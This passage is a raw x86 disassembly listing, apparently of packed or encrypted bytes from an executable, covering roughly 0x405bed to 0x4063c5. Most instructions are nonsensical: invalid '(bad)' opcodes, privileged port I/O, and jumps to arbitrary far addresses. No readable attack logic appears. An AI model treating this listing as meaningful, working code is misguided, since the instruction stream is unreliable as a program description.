  405bed:	shl    BYTE PTR [ecx],1
  405bef:	mov    ch,BYTE PTR [eax-0x6a8d64e5]
  405bf5:	scas   al,BYTE PTR es:[edi]
  405bf6:	repz pop ebx
  405bf8:	in     eax,0x22
  405bfa:	mov    ebp,0x7b92d98e
  405bff:	pop    eax
  405c00:	dec    ebp
  405c01:	aas    
  405c02:	cmovae esp,DWORD PTR [esi-0x4afbcca2]
  405c09:	imul   ebp,DWORD PTR [ebx+0x6c],0xffffffff
  405c0d:	scas   al,BYTE PTR es:[edi]
  405c0e:	sub    al,0x26
  405c10:	les    si,DWORD PTR cs:[ebx-0x4f1e13f1]
  405c18:	dec    DWORD PTR [bx-0x25]
  405c1c:	loope  0x405c1d
  405c1e:	scas   eax,DWORD PTR es:[edi]
  405c1f:	in     eax,dx
  405c20:	xchg   ebp,eax
  405c21:	rcr    DWORD PTR [ecx+ecx*4-0x7e2ee2c3],0x39
  405c29:	xchg   BYTE PTR [eax+0x28],cl
  405c2c:	mov    edi,0xeba4256b
  405c31:	jns    0x405c9b
  405c33:	adc    dl,BYTE PTR [edx-0x3a98557a]
  405c39:	out    0x9d,al
  405c3b:	outs   dx,DWORD PTR ds:[esi]
  405c3c:	(bad)  
  405c3d:	adc    al,BYTE PTR [ebp+0x44ab8e7f]
  405c43:	ret    
  405c44:	retf   
  405c45:	mov    ecx,0xa42aa910
  405c4a:	dec    edx
  405c4b:	cli    
  405c4c:	loop   0x405cc9
  405c4e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405c50:	xlat   BYTE PTR ds:[ebx]
  405c51:	test   BYTE PTR ds:0xf3048a49,bl
  405c57:	fldenv [edi+0x5c5110ce]
  405c5d:	mov    ecx,0xbc7a99d8
  405c62:	fwait
  405c63:	push   0xc60254e2
  405c68:	push   0xce6b0d1d
  405c6d:	lods   eax,DWORD PTR ds:[esi]
  405c6e:	int    0xe0
  405c70:	ins    DWORD PTR es:[edi],dx
  405c71:	cmp    eax,0xc2c42c20
  405c76:	adc    DWORD PTR [eax-0x4c83141b],0xffffffaf
  405c7d:	dec    edx
  405c7e:	pop    esp
  405c7f:	lods   eax,DWORD PTR es:[esi]
  405c81:	sti    
  405c82:	out    dx,al
  405c83:	sub    al,0xa0
  405c85:	sub    dl,BYTE PTR ds:0x13ab33eb
  405c8b:	pop    ebx
  405c8c:	mov    bl,dl
  405c8e:	adc    al,0xfe
  405c90:	idiv   eax
  405c92:	lea    eax,[edi-0x30]
  405c95:	jg     0x405cce
  405c97:	or     al,0x66
  405c99:	inc    esp
  405c9a:	or     eax,0xe05875f1
  405c9f:	and    al,0x8
  405ca1:	jge    0x405c41
  405ca3:	aaa    
  405ca4:	push   0x67
  405ca6:	pop    eax
  405ca7:	rcl    BYTE PTR [ecx+0x556ab3d8],1
  405cad:	rcr    BYTE PTR [ebx-0x53c73df0],cl
  405cb3:	inc    edi
  405cb4:	pop    ecx
  405cb5:	clc    
  405cb6:	jp     0x405c68
  405cb8:	mov    ecx,fs
  405cba:	addr16 cmp al,0xca
  405cbd:	nop
  405cbe:	daa    
  405cbf:	dec    edx
  405cc0:	mov    ch,0x9
  405cc2:	dec    eax
  405cc3:	les    esi,FWORD PTR [esp+ebp*1-0x36a12918]
  405cca:	sub    BYTE PTR [edi],ah
  405ccc:	out    dx,eax
  405ccd:	fisttp WORD PTR [edx-0x2b8209dd]
  405cd3:	adc    al,0x39
  405cd5:	or     BYTE PTR es:[eax+0x7b],bh
  405cd9:	out    dx,al
  405cda:	fstp   TBYTE PTR [esi]
  405cdc:	push   cs
  405cdd:	pop    ebx
  405cde:	mov    dl,0x93
  405ce0:	xchg   edx,eax
  405ce1:	into   
  405ce2:	cld    
  405ce3:	sub    DWORD PTR ds:0x2d58cf55,edx
  405ce9:	push   eax
  405cea:	aaa    
  405ceb:	jo     0x405cde
  405ced:	mov    al,BYTE PTR [ecx+0x68]
  405cf0:	or     ah,dl
  405cf2:	dec    esi
  405cf3:	int3   
  405cf4:	xchg   ebp,eax
  405cf5:	sub    al,0xe1
  405cf7:	jg     0x405cc3
  405cf9:	cmp    bh,0x76
  405cfc:	xor    al,0xf
  405cfe:	(bad)  
  405d00:	aas    
  405d01:	push   ss
  405d02:	adc    DWORD PTR [eax-0x37],ebx
  405d05:	push   ds
  405d06:	xor    esi,esp
  405d08:	mov    WORD PTR [eax+0x34],ss
  405d0b:	retf   
  405d0c:	or     ecx,DWORD PTR [ebp-0x29]
  405d0f:	test   eax,0x833a3fd3
  405d14:	inc    edi
  405d15:	leave  
  405d16:	lahf   
  405d17:	sbb    al,BYTE PTR [esp+ebx*2]
  405d1a:	sub    ebx,DWORD PTR [edx+0x3aef6855]
  405d20:	inc    ebp
  405d21:	iret   
  405d22:	sub    dl,cl
  405d24:	jg     0x405cdb
  405d26:	lock add BYTE PTR [eax],dl
  405d29:	shl    BYTE PTR [ecx+0x39444da1],0x81
  405d30:	dec    edx
  405d31:	retf   
  405d32:	sbb    edi,0xe753fb3d
  405d38:	or     eax,0x92e1e838
  405d3d:	push   ebp
  405d3e:	or     BYTE PTR [esi+0x42],0xdc
  405d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d43:	outs   dx,BYTE PTR ds:[esi]
  405d44:	sbb    al,0x16
  405d46:	mov    dl,0x83
  405d48:	enter  0x64dc,0x32
  405d4c:	sub    al,0x41
  405d4e:	ins    DWORD PTR es:[edi],dx
  405d4f:	cmp    BYTE PTR ds:0x256bc2df,al
  405d55:	mov    ch,0xd9
  405d57:	pop    edi
  405d58:	loopne 0x405dd7
  405d5a:	arpl   ax,bx
  405d5c:	xlat   BYTE PTR ds:[ebx]
  405d5d:	lods   al,BYTE PTR ds:[esi]
  405d5e:	cmp    edx,DWORD PTR [edx+edx*2-0x3c]
  405d62:	jno    0x405d01
  405d64:	ins    DWORD PTR es:[edi],dx
  405d65:	int    0x1f
  405d67:	jns    0x405ddd
  405d69:	mov    ecx,0x6de1cc0a
  405d6e:	(bad)  
  405d6f:	cld    
  405d70:	call   0x9e47:0x8a62dbbd
  405d77:	dec    eax
  405d78:	jle    0x405d05
  405d7a:	(bad)  
  405d7b:	jp     0x405ddb
  405d7d:	ror    esp,cl
  405d7f:	(bad)  
  405d80:	hlt    
  405d81:	mov    eax,ds:0xb09afa8
  405d86:	sti    
  405d87:	gs mov ebp,esp
  405d8a:	jge    0x405def
  405d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d8d:	xor    dl,BYTE PTR [edi-0x40]
  405d90:	adc    al,dh
  405d92:	outs   dx,BYTE PTR ds:[esi]
  405d93:	lea    ebp,[ebx+0xc219312]
  405d99:	retf   0xb7
  405d9c:	jecxz  0x405db9
  405d9e:	test   BYTE PTR [edi+0x45c928bf],ah
  405da4:	int    0x99
  405da6:	mov    ecx,0x537d3438
  405dab:	push   edi
  405dac:	xor    ch,BYTE PTR [ebx+0x6fc88111]
  405db2:	lods   al,BYTE PTR ds:[esi]
  405db3:	popf   
  405db4:	dec    esp
  405db5:	jge    0x405db4
  405db7:	leave  
  405db8:	(bad)  
  405dba:	xchg   ecx,eax
  405dbb:	jmp    0x405d7a
  405dbd:	xchg   edi,eax
  405dbe:	bound  edx,QWORD PTR ds:0x96d2b473
  405dc4:	xchg   BYTE PTR [ebx],dh
  405dc6:	push   ds
  405dc7:	and    esi,eax
  405dc9:	pop    ss
  405dca:	repnz add BYTE PTR [ebx+0x2],cl
  405dce:	stos   DWORD PTR es:[edi],eax
  405dcf:	enter  0xc213,0xf0
  405dd3:	imul   edx,DWORD PTR [ebx-0x6de0438d],0x2212520f
  405ddd:	push   edx
  405dde:	test   eax,0x505f5341
  405de3:	xchg   ebx,eax
  405de4:	icebp  
  405de5:	clc    
  405de6:	test   eax,0xe6538f49
  405deb:	adc    eax,0x7d8cadd1
  405df0:	mov    ds:0x32b93b63,eax
  405df5:	mov    edx,0x39fde58a
  405dfa:	mov    cl,0x86
  405dfc:	scas   eax,DWORD PTR es:[edi]
  405dfd:	or     BYTE PTR [ebx],dh
  405dff:	repz cmp ecx,0x4d7a0cc8
  405e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e07:	fyl2x  
  405e09:	and    eax,0x63735c1
  405e0e:	int    0xe
  405e10:	add    bx,WORD PTR [esi]
  405e13:	mov    al,ds:0xa5c55c32
  405e18:	sub    eax,0xd9bdc96a
  405e1d:	lock out dx,eax
  405e1f:	and    al,0x65
  405e21:	pop    esi
  405e22:	jg     0x405dff
  405e24:	lahf   
  405e25:	lea    ebp,[eax]
  405e27:	sbb    DWORD PTR [esi],esp
  405e29:	(bad)  
  405e2b:	jmp    0x6be0:0x5b8a3731
  405e32:	dec    edi
  405e33:	jge    0x405eb0
  405e35:	rcl    DWORD PTR [edi],1
  405e37:	or     al,0x58
  405e39:	push   ecx
  405e3a:	clc    
  405e3b:	jbe    0x405e06
  405e3d:	pop    ebx
  405e3e:	xchg   ebx,eax
  405e3f:	mov    ebp,0x2ff3bbcb
  405e44:	out    dx,eax
  405e45:	clc    
  405e46:	and    bl,BYTE PTR [esp+eax*1+0x4f]
  405e4a:	mov    BYTE PTR [edi+0x1b],ch
  405e4d:	jp     0x405e9e
  405e4f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  405e51:	inc    ebx
  405e52:	loope  0x405de5
  405e54:	xchg   edx,eax
  405e55:	pop    esp
  405e56:	ficomp DWORD PTR [eax-0x55]
  405e59:	jmp    0xc029:0xb6debd60
  405e60:	inc    edx
  405e61:	mov    edi,0xc82e4050
  405e66:	pop    ss
  405e67:	mov    ds:0xee7a0ea4,eax
  405e6c:	mov    eax,0x5c6911f
  405e71:	das    
  405e72:	cmp    DWORD PTR ds:0x9d10fd24,edi
  405e78:	(bad)  
  405e79:	imul   esp,DWORD PTR [edi+ebp*4-0x4fc94625],0x895592e1
  405e84:	inc    ebp
  405e85:	xchg   BYTE PTR [ecx-0x3f105362],dl
  405e8b:	jge    0x405e2c
  405e8d:	es in  al,dx
  405e8f:	push   ds
  405e90:	sub    BYTE PTR [edx+edi*1],0xca
  405e94:	ins    BYTE PTR es:[edi],dx
  405e95:	div    BYTE PTR [edi-0x56]
  405e98:	push   edi
  405e99:	cmc    
  405e9a:	mul    ecx
  405e9c:	(bad)  [edi]
  405e9e:	jl     0x405e66
  405ea0:	(bad)  
  405ea1:	dec    ebp
  405ea2:	lock pusha 
  405ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ea5:	jns    0x405e4d
  405ea7:	loop   0x405ec1
  405ea9:	les    esi,FWORD PTR [ecx]
  405eab:	icebp  
  405eac:	inc    ebx
  405ead:	retf   
  405eae:	enter  0xff05,0xda
  405eb2:	or     esi,DWORD PTR [ebp+0x7d]
  405eb5:	or     al,BYTE PTR [ebp+0x5498d4cf]
  405ebb:	ins    BYTE PTR es:[edi],dx
  405ebc:	xor    BYTE PTR [ebp-0x73],0xf4
  405ec0:	or     DWORD PTR [eax],edx
  405ec2:	in     al,0x51
  405ec4:	cs mov esp,0x6313b481
  405eca:	cmc    
  405ecb:	jne    0x405f4c
  405ecd:	sbb    BYTE PTR [ebx+ebp*4+0x5b885059],dl
  405ed4:	int3   
  405ed5:	inc    edx
  405ed6:	aam    0xe4
  405ed8:	cmp    BYTE PTR [ecx+0x5a],ah
  405edb:	stos   BYTE PTR es:[edi],al
  405edc:	ror    edx,cl
  405ede:	addr16 mov ds:0x153a,al
  405ee2:	xchg   esi,eax
  405ee3:	shl    dh,cl
  405ee5:	dec    esi
  405ee6:	data16 mov bh,0x47
  405ee9:	push   cs
  405eea:	inc    edi
  405eeb:	sbb    al,0x7c
  405eed:	outs   dx,BYTE PTR ds:[esi]
  405eee:	xlat   BYTE PTR ds:[ebx]
  405eef:	mov    edx,0xe8cd70de
  405ef4:	dec    ecx
  405ef5:	dec    ebp
  405ef6:	push   ebx
  405ef7:	adc    edx,DWORD PTR ds:0xaa148401
  405efd:	cdq    
  405efe:	out    0x6a,eax
  405f00:	fisub  WORD PTR [ebx-0x56b4760c]
  405f06:	xchg   ecx,eax
  405f07:	aaa    
  405f08:	xchg   ecx,eax
  405f09:	and    dh,0x4
  405f0c:	cmp    DWORD PTR [ebx+0x43178c02],edx
  405f12:	int3   
  405f13:	cwde   
  405f14:	test   eax,0x3c3c61d6
  405f19:	jle    0x405f93
  405f1b:	push   eax
  405f1c:	pusha  
  405f1d:	pusha  
  405f1e:	adc    ecx,esp
  405f20:	and    esi,DWORD PTR [ebp+0x78]
  405f23:	int    0x14
  405f25:	adc    esp,DWORD PTR [eax-0x36c079bf]
  405f2b:	jge    0x405f2d
  405f2d:	cmp    DWORD PTR [ecx-0x354c883b],eax
  405f33:	xchg   ebp,eax
  405f34:	xchg   ebp,eax
  405f35:	sub    BYTE PTR [ebp-0xf],0xb8
  405f39:	fsubr  QWORD PTR [eax]
  405f3b:	add    eax,0x36236247
  405f40:	dec    esp
  405f41:	gs popf 
  405f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f44:	outs   dx,DWORD PTR ds:[esi]
  405f45:	pop    es
  405f46:	arpl   WORD PTR [edi+0x1],bp
  405f49:	arpl   WORD PTR [esi+0x42],sp
  405f4c:	push   ebx
  405f4d:	call   0x11c0:0x127026c8
  405f54:	inc    ebp
  405f55:	pop    esi
  405f56:	dec    esi
  405f57:	jno    0x405f1a
  405f59:	jge    0x405f4c
  405f5b:	pusha  
  405f5c:	sbb    edx,DWORD PTR [ebp-0x1fe87dde]
  405f62:	pop    es
  405f63:	in     al,0xf8
  405f65:	sbb    al,bh
  405f67:	push   ebp
  405f68:	leavew 
  405f6a:	xor    esi,DWORD PTR [edi+ebx*2+0x755d4144]
  405f71:	imul   eax,DWORD PTR [edi+eax*8-0x68490a85],0xffffff98
  405f79:	push   es
  405f7a:	inc    eax
  405f7b:	sub    BYTE PTR [esi-0x1925b0b6],ch
  405f81:	cmp    al,0x6b
  405f83:	stos   BYTE PTR es:[edi],al
  405f84:	dec    ecx
  405f85:	sbb    BYTE PTR [edi+0x62b37e6b],dh
  405f8b:	adc    esp,eax
  405f8d:	dec    esp
  405f8e:	pop    esi
  405f8f:	aad    0x15
  405f91:	inc    esi
  405f92:	ds loop 0x405f79
  405f95:	imul   DWORD PTR [ecx]
  405f97:	into   
  405f98:	mov    ebp,DWORD PTR [esi-0x6d]
  405f9b:	fnsave fs:[edx+ebx*4-0x1eec821a]
  405fa3:	cmp    ebp,ebp
  405fa5:	pusha  
  405fa6:	scas   al,BYTE PTR es:[edi]
  405fa7:	mov    esp,0x3edcccfd
  405fac:	sbb    al,0x3b
  405fae:	push   ecx
  405faf:	mov    BYTE PTR [ebx-0x445fca0a],al
  405fb5:	loope  0x405f47
  405fb7:	add    al,0x89
  405fb9:	cmp    bl,BYTE PTR [eax]
  405fbb:	cmp    DWORD PTR [ecx],0xffffffc7
  405fbe:	dec    ebx
  405fbf:	in     al,dx
  405fc0:	and    BYTE PTR ds:0x99e0eacf,ch
  405fc6:	(bad)  
  405fc7:	push   eax
  405fc8:	sar    DWORD PTR [esi-0x44],0x6a
  405fcc:	int3   
  405fcd:	add    BYTE PTR [edx+0xf7c3d64],al
  405fd3:	jmp    0xe50b9e6e
  405fd8:	jae    0x405f8e
  405fda:	inc    BYTE PTR [ebx-0x30ef8ac]
  405fe0:	cli    
  405fe1:	xchg   ecx,eax
  405fe2:	dec    ebx
  405fe3:	aad    0xfa
  405fe5:	dec    eax
  405fe6:	pop    es
  405fe7:	push   ecx
  405fe8:	aas    
  405fe9:	fadd   DWORD PTR [ecx]
  405feb:	imul   ebx,DWORD PTR [ebx+eax*4],0x69
  405fef:	stos   BYTE PTR es:[edi],al
  405ff0:	fimul  WORD PTR [eax]
  405ff2:	mov    eax,ds:0x6d0332b4
  405ff7:	pop    ss
  405ff8:	fidivr DWORD PTR [esi-0x32]
  405ffb:	xchg   esp,eax
  405ffc:	popa   
  405ffd:	jmp    0xd823f177
  406002:	clc    
  406003:	sbb    ebp,DWORD PTR [edx]
  406005:	das    
  406006:	cld    
  406007:	mov    cs,ebx
  406009:	push   0xffffffb0
  40600b:	add    eax,0x88955da8
  406010:	jecxz  0x406050
  406012:	push   cs
  406013:	es and eax,0x56c17ad7
  406019:	retf   0xc230
  40601c:	aas    
  40601d:	aam    0x35
  40601f:	test   eax,0x2cb288cd
  406024:	dec    ebp
  406025:	xchg   edx,eax
  406026:	inc    esi
  406027:	mov    ah,0x33
  406029:	jmp    0x40603c
  40602b:	leave  
  40602c:	and    BYTE PTR [ebx+0x40],bl
  40602f:	lods   al,BYTE PTR ds:[esi]
  406030:	pusha  
  406031:	sbb    BYTE PTR [edi],bh
  406033:	fwait
  406034:	dec    esi
  406035:	aaa    
  406036:	push   edx
  406037:	pop    edi
  406038:	fidivr WORD PTR [ebp+0xca11643]
  40603e:	and    BYTE PTR [ebx-0x42],bh
  406041:	add    BYTE PTR [ecx-0x48],cl
  406044:	cmp    al,0x50
  406046:	pop    edi
  406047:	add    al,0x8c
  406049:	jno    0x40608b
  40604b:	imul   edx,ebx,0xb82bb4f0
  406051:	sbb    BYTE PTR [edi+ecx*4],cl
  406054:	add    al,0xd8
  406056:	or     BYTE PTR [edi+0x3b496a82],cl
  40605c:	repz sbb BYTE PTR [eax+0xdeb4253],al
  406063:	fs xchg edi,eax
  406065:	dec    ebp
  406066:	adc    BYTE PTR [eax],al
  406068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406069:	push   ebx
  40606a:	in     eax,dx
  40606b:	jecxz  0x406015
  40606d:	sub    eax,0x91394fb8
  406072:	fbstp  TBYTE PTR ds:0x2d1f8535
  406078:	jp     0x406057
  40607a:	dec    edi
  40607b:	mov    edx,0xbb790813
  406080:	add    al,0x56
  406082:	pusha  
  406083:	inc    eax
  406084:	pop    esi
  406085:	adc    eax,0xca67a201
  40608a:	stos   DWORD PTR es:[edi],eax
  40608b:	aaa    
  40608c:	sub    eax,ecx
  40608e:	(bad)  
  40608f:	jb     0x4060b3
  406091:	inc    esp
  406092:	mov    DWORD PTR [esi],esp
  406094:	mov    eax,ds:0x4c2c843f
  406099:	xchg   ecx,eax
  40609a:	les    edx,FWORD PTR [edi-0xb1e7386]
  4060a0:	ss scas al,BYTE PTR es:[edi]
  4060a2:	(bad)  
  4060a4:	jno    0x40606b
  4060a6:	cmp    eax,0x6e9d7466
  4060ab:	into   
  4060ac:	xlat   BYTE PTR ds:[ebx]
  4060ad:	out    dx,al
  4060ae:	pop    ecx
  4060af:	rcl    BYTE PTR [ebx-0x2c],cl
  4060b2:	add    eax,0xa4872ffe
  4060b7:	stos   BYTE PTR es:[edi],al
  4060b8:	jae    0x4060b4
  4060ba:	leave  
  4060bb:	daa    
  4060bc:	and    BYTE PTR [edi+0x5],ch
  4060bf:	mov    bl,0x56
  4060c1:	fmul   QWORD PTR [ebx-0x2f7663b1]
  4060c7:	sbb    ebx,DWORD PTR [ecx-0x7c43f998]
  4060cd:	(bad)  
  4060ce:	std    
  4060cf:	popf   
  4060d0:	or     al,0xab
  4060d2:	mov    ebx,0x46841981
  4060d7:	push   0x6e
  4060d9:	or     DWORD PTR [esi+0x6e],ecx
  4060dc:	in     al,dx
  4060dd:	hlt    
  4060de:	es dec ebx
  4060e0:	mov    bl,BYTE PTR [eax-0x367fd6ea]
  4060e6:	mov    bh,0x3d
  4060e8:	adc    BYTE PTR [ecx],bh
  4060ea:	jl     0x406118
  4060ec:	jne    0x4060b3
  4060ee:	and    al,0x8e
  4060f0:	fadd   st(7),st
  4060f2:	loop   0x406162
  4060f4:	cmc    
  4060f5:	les    ebx,FWORD PTR [ebp-0x34d7d086]
  4060fb:	(bad)
  4060ff:	pop    ds
  406100:	icebp  
  406101:	stos   BYTE PTR es:[edi],al
  406102:	jl     0x40614f
  406104:	sbb    al,0x30
  406106:	and    esi,DWORD PTR ds:0xca75b4fb
  40610c:	in     al,0x75
  40610e:	pusha  
  40610f:	pop    es
  406110:	not    DWORD PTR [ebp-0x27]
  406113:	lock jne 0x40612d
  406116:	pop    ebp
  406117:	xchg   esp,eax
  406118:	push   ebx
  406119:	shl    DWORD PTR [ecx],1
  40611b:	sub    al,0x0
  40611d:	mov    cl,0x7a
  40611f:	icebp  
  406120:	pop    ds
  406121:	add    cl,0xe1
  406124:	xchg   ebx,eax
  406125:	jle    0x406123
  406127:	dec    eax
  406128:	pop    ecx
  406129:	adc    bl,ch
  40612b:	rol    BYTE PTR ss:[edi+0x61868f7f],0x5e
  406133:	mov    ebx,0x1c489296
  406138:	out    0x27,eax
  40613a:	retf   0x8877
  40613d:	pop    esi
  40613e:	call   0xa422:0x23a9b94d
  406145:	adc    eax,0xdde3eb9c
  40614a:	ficom  DWORD PTR [ebx]
  40614c:	jl     0x40618c
  40614e:	jp     0x406122
  406150:	cmp    BYTE PTR [ecx],ah
  406152:	cmp    BYTE PTR [eax-0x253aa0e7],0xe1
  406159:	loop   0x40617c
  40615b:	push   0x6ad584bc
  406160:	push   ebx
  406161:	rcr    BYTE PTR [ebp+eax*4-0x1a],0x92
  406166:	sub    eax,0x86baa33c
  40616b:	push   esi
  40616c:	push   edi
  40616d:	sub    DWORD PTR [ebx+0x4f2f5da6],esp
  406173:	mul    esi
  406175:	xchg   esp,eax
  406176:	mov    edi,0xae5eab2d
  40617b:	xor    eax,0xe1c2417e
  406180:	cmp    dl,BYTE PTR es:[ebx]
  406183:	xchg   ebp,eax
  406184:	sub    esi,edi
  406186:	ja     0x406177
  406188:	les    esp,FWORD PTR [eax-0x50]
  40618b:	xor    DWORD PTR [ebx+0x2f9bd925],edi
  406191:	fisub  WORD PTR [ebp+0x24]
  406194:	or     BYTE PTR [eax],bh
  406196:	and    edi,DWORD PTR [eax+edx*1-0x1d988cac]
  40619d:	inc    edi
  40619e:	add    DWORD PTR es:[edi-0x2d05f955],esi
  4061a5:	jmp    0x40617e
  4061a7:	mov    eax,0xe0c1a048
  4061ac:	in     eax,0xee
  4061ae:	jmp    0x406219
  4061b0:	pop    ecx
  4061b1:	(bad)  
  4061b3:	or     eax,0x5433e858
  4061b8:	out    dx,al
  4061b9:	cmp    bl,bh
  4061bb:	add    esp,DWORD PTR [ebx+0x27]
  4061be:	jmp    DWORD PTR [edi+0x28807682]
  4061c4:	inc    ebp
  4061c5:	push   esp
  4061c6:	pop    edi
  4061c7:	sti    
  4061c8:	mov    ch,BYTE PTR [ecx]
  4061ca:	push   ss
  4061cb:	fnsave [ecx+0x3a2382d1]
  4061d1:	fsub   QWORD PTR [ecx]
  4061d3:	aad    0xcc
  4061d5:	pop    eax
  4061d6:	ret    0x995a
  4061d9:	add    dl,cl
  4061db:	push   edx
  4061dc:	xchg   esp,eax
  4061dd:	cs shl bh,cl
  4061e0:	jecxz  0x406213
  4061e2:	sbb    ecx,eax
  4061e4:	dec    edi
  4061e5:	ror    DWORD PTR [ebp-0x43],1
  4061e8:	fwait
  4061e9:	retf   0x5c4c
  4061ec:	or     ecx,DWORD PTR [edi+edx*1+0x46c5f6fe]
  4061f3:	add    DWORD PTR [ebp+eiz*2-0x32b326db],ebx
  4061fa:	cmp    ecx,esp
  4061fc:	(bad)  
  4061ff:	es arpl sp,bp
  406202:	(bad)  
  406203:	into   
  406204:	xor    BYTE PTR [edx+0x1d2d811a],dh
  40620a:	aaa    
  40620b:	push   0x576d81b3
  406210:	fisubr WORD PTR [ecx+0x61]
  406213:	push   esi
  406214:	add    al,0xbc
  406216:	mov    ebx,cs
  406218:	in     al,0xae
  40621a:	sbb    al,0x6e
  40621c:	add    ecx,DWORD PTR [edi+0x6a]
  40621f:	and    al,0xd
  406221:	sbb    al,0xd8
  406223:	and    eax,0x3fade73d
  406228:	push   cs
  406229:	(bad)  
  40622a:	repnz mov dl,BYTE PTR [eax]
  40622d:	pop    ss
  40622e:	fiadd  WORD PTR [eax]
  406230:	call   0x6855ebb7
  406235:	xchg   edi,eax
  406236:	mov    BYTE PTR [edi-0x44],dl
  406239:	fcmovbe st,st(2)
  40623b:	xchg   BYTE PTR [ebx-0x29],ah
  40623e:	mov    ebp,0xd2db8600
  406243:	hlt    
  406244:	jno    0x406249
  406246:	xchg   ecx,eax
  406247:	cmc    
  406248:	sti    
  406249:	scas   eax,DWORD PTR es:[edi]
  40624a:	xchg   esp,eax
  40624b:	mov    bh,0xf9
  40624d:	jecxz  0x4061eb
  40624f:	scas   eax,DWORD PTR es:[edi]
  406250:	dec    ecx
  406251:	std    
  406252:	mov    ah,0xb4
  406254:	push   eax
  406255:	test   DWORD PTR [edx-0x5d],0xd019a357
  40625c:	mov    bl,0xcb
  40625e:	mov    esi,0x9f3dcf3d
  406263:	sbb    al,0x96
  406265:	adc    al,0xef
  406267:	mov    edx,0xff984101
  40626c:	xchg   ebx,eax
  40626d:	shl    DWORD PTR [ecx-0x50],0xd9
  406271:	xchg   esi,eax
  406272:	fwait
  406273:	or     al,0xef
  406275:	mov    ?,WORD PTR [esi-0x5175bdc7]
  40627b:	push   es
  40627c:	adc    BYTE PTR [ebp-0x11c4926a],0xd
  406283:	bound  esp,QWORD PTR [ebx-0x2a42b7be]
  406289:	fsub   st(4),st
  40628b:	add    esp,DWORD PTR ds:0x69bd9c70
  406291:	mov    esp,0xfd904c61
  406296:	and    BYTE PTR [ebx],0xb
  406299:	ins    DWORD PTR es:[edi],dx
  40629a:	pop    ebp
  40629b:	scas   al,BYTE PTR es:[edi]
  40629c:	arpl   WORD PTR ds:0xd46a63b0,cx
  4062a2:	in     al,0xc3
  4062a4:	push   ecx
  4062a5:	mov    ecx,0x59254e1
  4062aa:	aam    0x1f
  4062ac:	pop    edx
  4062ad:	mov    dh,0x63
  4062af:	sub    dh,bl
  4062b1:	sbb    al,0xc
  4062b3:	mov    ch,0xc7
  4062b5:	leave  
  4062b6:	inc    edx
  4062b7:	sub    bl,BYTE PTR [edx]
  4062b9:	and    BYTE PTR [edi+0x29],bl
  4062bc:	ds daa 
  4062be:	sub    cl,BYTE PTR [ecx+edi*8+0x69499ba8]
  4062c5:	daa    
  4062c6:	cli    
  4062c7:	sbb    esp,DWORD PTR [ecx-0x37]
  4062ca:	cmp    ebp,DWORD PTR [ebx+0x651c214d]
  4062d0:	jmp    0x4062e4
  4062d2:	ret    0xe28b
  4062d5:	push   esp
  4062d6:	cmp    DWORD PTR [esi+0x6a],ecx
  4062d9:	dec    eax
  4062da:	mov    BYTE PTR ds:0x147b8a75,dl
  4062e0:	xor    DWORD PTR [ebx+0x3ae21643],0x703b8040
  4062ea:	add    ebp,edi
  4062ec:	mov    edi,0xc9cb34e1
  4062f1:	(bad)  
  4062f2:	fcom   QWORD PTR [eax]
  4062f4:	daa    
  4062f5:	shr    bl,cl
  4062f7:	dec    ecx
  4062f8:	sub    al,0x99
  4062fa:	jne    0x4062ad
  4062fc:	add    BYTE PTR [ebp+0x31],ch
  4062ff:	push   es
  406300:	xor    al,BYTE PTR [edx-0x6f]
  406303:	jg     0x40629b
  406305:	out    0x7f,eax
  406307:	shl    al,cl
  406309:	pop    edi
  40630a:	int3   
  40630b:	cmp    ebx,ecx
  40630d:	pop    edx
  40630e:	data16 or BYTE PTR [ebx],dh
  406311:	sub    DWORD PTR [eax],eax
  406313:	repz inc edx
  406315:	in     al,dx
  406316:	das    
  406317:	rcl    cl,1
  406319:	add    BYTE PTR ds:0xfa552f66,dh
  40631f:	jg     0x406390
  406321:	dec    esp
  406322:	and    BYTE PTR [esi+esi*2-0x7a],0x61
  406327:	jge    0x406382
  406329:	dec    edi
  40632a:	jmp    0x97e0:0x915d9be1
  406331:	jmp    DWORD PTR [ebp+0x1d77ba22]
  406337:	sub    al,0x69
  406339:	jge    0x40634b
  40633b:	aad    0x9
  40633d:	push   edx
  40633e:	inc    ecx
  40633f:	in     al,dx
  406340:	xor    al,0xc7
  406342:	add    eax,0x8912ced8
  406347:	cmp    BYTE PTR [esi+0x11],ch
  40634a:	sub    BYTE PTR [esi],al
  40634c:	fsub   QWORD PTR [ecx+ebp*1+0x7f6e6ef0]
  406353:	jmp    0x4063cd
  406355:	jg     0x4062e8
  406357:	sbb    edi,edx
  406359:	mov    dh,0xfa
  40635b:	cmp    dh,BYTE PTR [eax+edi*4]
  40635e:	adc    edi,DWORD PTR [esi+0x325ed5dd]
  406364:	jns    0x4062ef
  406366:	call   0xde9e5c1f
  40636b:	ds jno 0x40634f
  40636e:	ins    DWORD PTR es:[edi],dx
  40636f:	outs   dx,BYTE PTR ds:[esi]
  406370:	jae    0x4063af
  406372:	(bad)
  406375:	xor    ah,al
  406377:	mov    cl,BYTE PTR [ebx+0x48c698f9]
  40637d:	ja     0x406310
  40637f:	les    esp,FWORD PTR [ebx-0x3265280]
  406385:	pop    ss
  406386:	outs   dx,BYTE PTR ds:[esi]
  406387:	aas    
  406388:	nop
  406389:	sub    eax,0x6bca7c7e
  40638e:	cmp    esi,ecx
  406390:	mov    DWORD PTR cs:[edx+0x5ea2fd40],esi
  406397:	push   es
  406398:	les    esp,FWORD PTR [edx]
  40639a:	mov    ebx,0xd162341
  40639f:	pusha  
  4063a0:	mov    esp,0x4cfae10e
  4063a5:	mov    al,BYTE PTR [edx-0x18]
  4063a8:	stc    
  4063a9:	repnz push esi
  4063ab:	jns    0x406335
  4063ad:	xor    dl,BYTE PTR [ecx+0x3a]
  4063b0:	hlt    
  4063b1:	sub    DWORD PTR [edi+0x39],esi
  4063b4:	sub    DWORD PTR [ebx+0x19],ecx
  4063b7:	js     0x4063e0
  4063b9:	lock cld 
  4063bb:	lods   al,BYTE PTR ds:[esi]
  4063bc:	call   0x700b:0xc87aed5
  4063c3:	(bad)  [eax]
  4063c5:	imul   ecx,DWORD PTR [ebx],0x506ce671
